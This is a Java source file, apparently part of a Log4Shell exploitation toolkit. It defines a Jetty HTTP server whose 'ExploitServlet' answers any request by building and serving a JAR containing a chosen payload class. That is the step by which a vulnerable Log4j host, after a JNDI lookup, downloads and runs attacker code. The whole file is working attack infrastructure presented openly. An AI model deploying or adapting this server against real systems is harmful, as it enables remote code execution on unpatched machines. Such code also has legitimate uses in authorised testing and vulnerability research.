package fr.thesmyler.log4shell;

import fr.thesmyler.log4shell.payloads.PayloadGenerator;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.eclipse.jetty.server.Server;
import org.eclipse.jetty.server.ServerConnector;
import org.eclipse.jetty.servlet.ServletHandler;

import java.io.File;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.file.Files;
import java.util.LinkedList;
import java.util.List;

public class HttpJndiServer extends Server {

    private final List<URL> baseUrls = new LinkedList<>();
    private Class<?> defaultPayload = null;

    private static HttpJndiServer instance;

    public static HttpJndiServer instance() {
        if (instance == null) {
            instance = new HttpJndiServer();
        }
        return instance;
    }

    private HttpJndiServer() {
        this.setStopAtShutdown(true);
        ServletHandler handler = new ServletHandler();
        this.setHandler(handler);
        handler.addServletWithMapping(ExploitServlet.class, "/");
    }

    public void addConnector(String host, int port) throws MalformedURLException {
        URL url = new URL("http://" + host + ":" + port);
        ServerConnector connector = new ServerConnector(this);
        connector.setHost(host);
        connector.setPort(port);
        this.addConnector(connector);
        this.baseUrls.add(url);
    }

    public static class ExploitServlet extends HttpServlet {

        public ExploitServlet() {
            super();
        }

        @Override
        public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
            if (HttpJndiServer.instance().defaultPayload == null) {
                response.setStatus(HttpServletResponse.SC_NOT_FOUND);
                response.getWriter().println("404 Not Found");
                return;
            }
            PayloadGenerator generator = new PayloadGenerator();
            generator.addClass(request.getRequestURI().replaceFirst("/", ""), HttpJndiServer.instance().defaultPayload);
            ExploitLauncher.LOGGER.info("Got request: {}", request.getRequestURI());
            response.setStatus(HttpServletResponse.SC_OK);
            byte[] jar = generator.generateJar();
            Files.write(new File("/tmp/test.jar").toPath(), jar);
            response.getOutputStream().write(jar);
            response.getOutputStream().close();
        }

    }

    public URL getUrl() {
        return this.baseUrls.get(0);
    }

    public void setDefaultPayload(Class<?> defaultPayload) {
        this.defaultPayload = defaultPayload;
    }
}
